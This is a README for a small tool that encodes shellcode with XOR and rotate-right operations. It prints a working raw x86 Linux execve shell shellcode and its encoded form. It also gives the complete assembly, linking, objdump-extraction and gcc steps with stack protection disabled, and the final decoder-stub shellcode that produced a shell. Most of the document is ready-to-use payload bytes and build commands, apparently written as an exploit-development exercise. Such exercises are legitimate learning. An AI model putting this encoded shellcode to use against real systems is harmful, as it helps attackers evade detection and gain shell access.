# XOR-ROR-Enocder-Decoder
Rotate Right + XOR Encoder

The purpose if this Encoder is to encode a shellcode using XOR and rotate right operations.
Use the Encoder.py first and then Decoder.nasm

# Getting started:
root@kali:~# ./encoder.py
Encoded shellcode....

Len : 25
0x49,0xb1,0xf9,0xe5,0x46,0x46,0x68,0xe5,0xe5,0x46,0xe0,0x65,0xe6,0x15,0x20,0xf9,0x15,0xa0,0x78,0x15,0x21,0x89,0x54,0x37,0x91,


Shellcode for c....


\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

[+] The "Shellcode for c" is just a raw shellcode not encoded, in case if you want to test it first without encoding it.

[+] Copy and paste the encoded shellcode to decoder.nasm


root@kali:~# nasm -f elf32 -o shell.o shell.nasm

root@kali:~# ld -z execstack -o shell shell.o

root@kali:~# objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\xeb\x2d\x5e\x31\xdb\x31\xc0\x8a\x1e\x80\xf3\x99\x74\x26\x8a\x1e\x88\xd8\x84\xc0\x78\x09\xd0\xe0\x34\xa3\x88\x06\x46\xeb\xe4\x66\x0f\xba\xf0\x07\xd0\xe0\x04\x01\x34\xa3\x88\x06\x46\xeb\xd4\xe8\xce\xff\xff\xff\x49\xb1\xf9\xe5\x46\x46\x68\xe5\xe5\x46\xe0\x65\xe6\x15\x20\xf9\x15\xa0\x78\x15\x21\x89\x54\x37\x91\x99"

[+] We copy the output shellcode to the c file shell-code.c

root@kali:~# gcc -fno-stack-protector -z execstack shell-code.c -o shell-code
root@kali:~# ./shell-code
Shellcode Length: 79
#

We got a shell NICE ! :-)
